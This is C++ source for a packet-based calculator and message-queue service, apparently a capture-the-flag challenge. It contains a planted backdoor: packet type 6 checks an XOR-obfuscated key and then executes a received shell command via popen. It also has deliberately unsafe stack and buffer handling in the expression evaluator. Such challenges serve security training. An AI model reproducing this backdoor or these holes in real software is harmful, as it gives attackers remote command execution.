#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <uuid/uuid.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <string>
#include <queue>
#include <map>

#define BUF_SIZE 0x100
#define LENGTH 100

using namespace std;

typedef unsigned char byte;

typedef struct {
    int top;
    long long pool[LENGTH];
} stack;

typedef struct Data{
  string corr_id;
  string res;
} Data;

typedef queue<Data> Q;
typedef map<string,Q> MQ;

map<string,Q>::iterator it_find;

byte RECV_MAGIC[4]={'R','P','C','M'};
char* EVIL_INS=(char*)"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf<LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11";

unsigned char* p32(int value) {
  unsigned char* result;
  result = (unsigned char*)malloc(4*sizeof(char));
  result[0] = (byte)((value >> 24) & 0xff);
  result[1] = (byte)((value >> 16) & 0xff);
  result[2] = (byte)((value >> 8) & 0xff);
  result[3] = (byte)(value & 0xff);
  return result;
}

char* StrTrim(char* pStr)
{
    char *pTmp = (char*)malloc((strlen(pStr)+1)*sizeof(char));
    memset(pTmp,0,strlen(pStr)+1);
    int mark = 0;
    int i;
    for (i = 0; i < strlen(pStr); i++)
    {
        if (pStr[i] != ' ')
        {
            pTmp[mark] = pStr[i];
            mark++;
        }
    }
    pTmp[mark] = '\x00';
    return pTmp;
}

int myatoi(char* buf) {
    int sum = 0;
    while (*buf) {
        sum = sum * 10 + (*buf - '0');
        buf++;
    }
    return sum;
}

int read_str(char* buf, int n) {
    int t = read(0, buf, n-1);
    if (buf[t - 1] == '\n') {
        buf[t - 1] = '\x00';
    }
    buf[t]='\x00';
    return t;
}
int input_pass(char* buf, int size) {
    int ret = 1;
    int i;
    for (i = 0; i < size; i++) {
        char c = buf[i];
        if (!((c >= '0' && c <= '9') || c == '+' || c == '-' || c == '*' || c == '/' || c == '\x00' || c == '(' || c == ')')) {
            ret = 0;
            break;
        }
    }
    for (i = 0; i < size-1; i=i+2) {
        char c1 = buf[i];
        char c2 = buf[i+1];
        if(c1 == '+' || c1 == '-' || c1 == '*' || c1 == '/')
        {
          if(!(c2 >= '0' && c2 <= '9'))
            ret = 0;
            break;
        }
        if(c2 == '+' || c2 == '-' || c2 == '*' || c2 == '/')
        {
          if(!(c1 >= '0' && c1 <= '9'))
            ret = 0;
            break;
        }
    }
    return ret;
}

void push(stack* s, int value) {
    if (s->top >= 0) {
        s->top--;
        s->pool[s->top] = value;
    }
}

int priority(int a) {
    int ret;
    switch (a) {
        case '(':
            ret = 5;
            break;
        case '*':
        case '/':
            ret = 4;
            break;
        case '+':
        case '-':
            ret = 3;
            break;
        case ')':
            ret=2;
            break;
        case 0:
            ret = 1;
            break;
        case -1:
            ret = 0;
            break;
    }
    return ret;
}

void deal_data(stack* array, stack* opt) {
    char c = opt->pool[opt->top];
    opt->top++;
    long long a = array->pool[array->top];
    array->top++;
    long long b = array->pool[array->top];
    switch (c) {
        case '+':
            array->pool[array->top] = a + b;
            break;
        case '-':
            array->pool[array->top] = b - a;
            break;
        case '*':
            array->pool[array->top] = a * b;
            break;
        case '/':
            if (a != 0)
                array->pool[array->top] = b / a;
            else
                array->pool[array->top] = 0xFFFFFFFF;
            break;
        default:
            break;
    }
}

int calc(char* expr, char* result)
{
  char *temp, *str;
  struct {
        char dest[BUF_SIZE];
        char buf[BUF_SIZE];
        stack opt;
        stack array;
    } var;
  var.array.top = LENGTH;
  var.opt.top = LENGTH;
  push(&var.opt, 0xFFFFFFFF);
  char* tmp = StrTrim(expr);
  memset(var.buf,0,BUF_SIZE);
  memcpy(var.buf,tmp,strlen(tmp)+1);
  int size = strlen(tmp)+1;
  if (!input_pass(var.buf, strlen(var.buf))) {
      return -1;
  }

  str = var.buf;
  while (str - var.buf < size) 
  {
    temp = var.dest;
    while (str - var.buf < size && *str >= '0' && *str <= '9') {
        *temp = *str;
        temp++;
        str++;
    }
    *temp = '\x00';
    if (*var.dest) {
        int num = myatoi(var.dest);
        push(&var.array, num);
    }
    while (1) {
        if ( var.opt.pool[var.opt.top] == '(' || priority(var.opt.pool[var.opt.top]) < priority((int)*str)) {
            if(*str != ')')                    
                push(&var.opt, (int)*str);
            else
                var.opt.top++;
            break;
        } else {
            deal_data(&var.array, &var.opt);
        }
    }
    if (*str == '\x00') {
        break;
    }
    str++;
  }
  sprintf(result, "%lld", var.array.pool[var.array.top]);
  return 0;
}


char* construct_result(char* key)
{
  int length = strlen(key);
  char* packet = (char*)malloc((length+12+4+1)*sizeof(char));
  memset(packet,0,length+12+4+1);
  memcpy(packet, (byte*)"RPCN", 4);
  memcpy(packet+4, (byte*)p32(length+12+4), 4);
  memcpy(packet+8, (byte*)"\x00\x00\xbe\xf2", 4);
  memcpy(packet+12, (byte*)p32(length), 4);
  memcpy(packet+16, (byte*)key, length);
  return packet;
}

int magiccmp(byte b1[4], byte b2[4])
{
  int i;
  for(i = 0; i < 4;i++)
  {
    if(b1[i]!=b2[i])
      return 1;
  }
  return 0;
}

void encrypt(char* key)
{
  int i;
  int k=0;
  for(i=0;i<36;i++)
  {
    key[i]=(key[i]^k)%256;
    k+=23;
  }
}

int bytecmp(char* a,char* b)
{
  int length = strlen(b);
  int i;
  for(i=0;i<length;i++)
  {
    if(a[i]!=b[i])
      return 1;
  }
  return 0;
}

int backdoor(int sock)
{
  const char* retry_packet="RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1";
  byte* buf  = (byte*)malloc(100*sizeof(byte));
  memset(buf, 0, 100);
  char* key = (char*)malloc(37*sizeof(char));
  memset(key,0,37);
  char* cmd = (char*)malloc(30*sizeof(char));
  memset(cmd,0,30);

  read(sock,buf,4);
  int key_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);

  if(key_len!=36)
  {
    write(STDOUT_FILENO, retry_packet, 12);
    return -1;
  }
  read(sock,key, key_len);

  encrypt(key);
  if(bytecmp(key,EVIL_INS)!=0)
  {
    write(STDOUT_FILENO, retry_packet, 12);
    return -1;
  }
  read(sock,buf,4);
  int cmd_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);

  if(cmd_len>22)
  {
    write(STDOUT_FILENO, retry_packet, 12);
    return -1;
  }
  read(sock,cmd, cmd_len);

  FILE* fp = NULL;
  char* output = (char*)malloc(50);
  memset(output,0,50);

  if ((fp = popen(cmd, "r")) != NULL)
  {
      fgets(output, 50, fp);
      write(STDOUT_FILENO, output, strlen(output));
      pclose(fp);
  }
  else
  {
    write(STDOUT_FILENO, retry_packet, 12);
  }
  return 0;
}


void handle(int sockConn, MQ mq)
{
  int starting = 0;
  const char* error_packet="RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0";
  const char* retry_packet="RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1";
  const char* done_packet="RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef";
  while(1)
  {
    byte* buf  = (byte*)malloc(50*sizeof(byte));
    memset(buf, 0, 50);
    read(sockConn,buf,4);
    if(magiccmp(buf,RECV_MAGIC)== 0)
    {
      read(sockConn,buf,4);
      int length = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);
      read(sockConn,buf,4);
      int packet_type = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);
      int key_len, id_len, expr_len, res_len, status, i;
      char* key = (char*)malloc(37*sizeof(char));
      memset(key,0,37);
      string skey;
      string s_corr_id;
      string s_res;
      char* corr_id;
      char* packet;
      char* expr;
      char* res;
      Q q;
      Data d;
      switch(packet_type)
      {
        case 0:
          // connect
          if(starting == 0)
          {
            starting = 1;
            write(STDOUT_FILENO, done_packet, 12);
          }
          else
          {
            write(STDOUT_FILENO, error_packet, 12);
          }
          break;
        case 1:
          // declare
          uuid_t uuid;
          uuid_generate(uuid);
          uuid_unparse(uuid, key);
          skey = key;
          mq.insert(pair<string,Q>(skey,q));
          packet = construct_result(key);
          write(STDOUT_FILENO, packet, 36+12+4);
          break;
        case 2:
          // retrieve
          read(sockConn,buf,4);
          key_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);
          read(sockConn,key, key_len);

          read(sockConn,buf,4);
          id_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);          
          corr_id = (char*)malloc((id_len+1)*sizeof(char));
          memset(corr_id,0,id_len+1);
          read(sockConn,corr_id, id_len);
          if(key_len+id_len!=length-12-4-4)
          {
            write(STDOUT_FILENO, error_packet, 12);
            break;
          }
          skey = key;
          s_corr_id = corr_id;
          it_find = mq.find(skey);
          if(it_find!=mq.end())
          {
            i = mq[skey].size();
            if((i==0) || mq[skey].front().corr_id != s_corr_id)
            {
              write(STDOUT_FILENO, retry_packet, 12);
              break;
            }
            else
            {
              // 出队
              res_len = strlen(mq[skey].front().res.c_str());
              packet = construct_result((char*)mq[skey].front().res.c_str());
              mq[skey].pop();
              write(STDOUT_FILENO, packet, res_len+12+4);
              break;             
            }
          }
          else
          {
            write(STDOUT_FILENO, error_packet, 12);
          }
          break;
        case 3:
          // call
          read(sockConn,buf,4);
          key_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);
          read(sockConn,key, key_len);

          read(sockConn,buf,4);
          id_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);          
          corr_id = (char*)malloc((id_len+1)*sizeof(char));
          memset(corr_id,0,id_len+1);
          read(sockConn,corr_id, id_len);
          
          read(sockConn,buf,4);
          expr_len = buf[3]+(buf[2]<<8)+(buf[1]<<16)+(buf[0]<<24);          
          expr = (char*)malloc((expr_len+1)*sizeof(char));
          memset(expr,0,expr_len+1);
          read(sockConn,expr, expr_len);

          if(key_len+id_len+expr_len!=length-12-4-4-4)
          {
            write(STDOUT_FILENO, error_packet, 12);
            break;
          }
          // 执行运算
          res = (char*)malloc(50*sizeof(char));
          memset(res,0,50);
          status = calc(expr,res);
          if(status == -1)
          {
            write(STDOUT_FILENO, error_packet, 12);
            break;
          }
          skey = key;
          s_corr_id = corr_id;
          s_res = res;
          it_find = mq.find(skey);
          
          if(it_find!=mq.end())
          {
            // 入队
            d.corr_id = s_corr_id;
            d.res = s_res;
            mq[skey].push(d);
            write(STDOUT_FILENO, done_packet, 12);
          }
          else
          {
            write(STDOUT_FILENO, error_packet, 12);
          }
          break;
        case 4:
          // close 
          return;         
          // break;
        case 6:
          backdoor(sockConn);
          break;          
        default:
          // error
          write(STDOUT_FILENO, error_packet, 12);
          break;
      }
    }
    else
    {
      write(STDOUT_FILENO, error_packet, 12);
    }
  }
}

int main() {
  setbuf(stdout, 0);
  MQ mq;
  handle(STDIN_FILENO, mq);

  return 0;
}
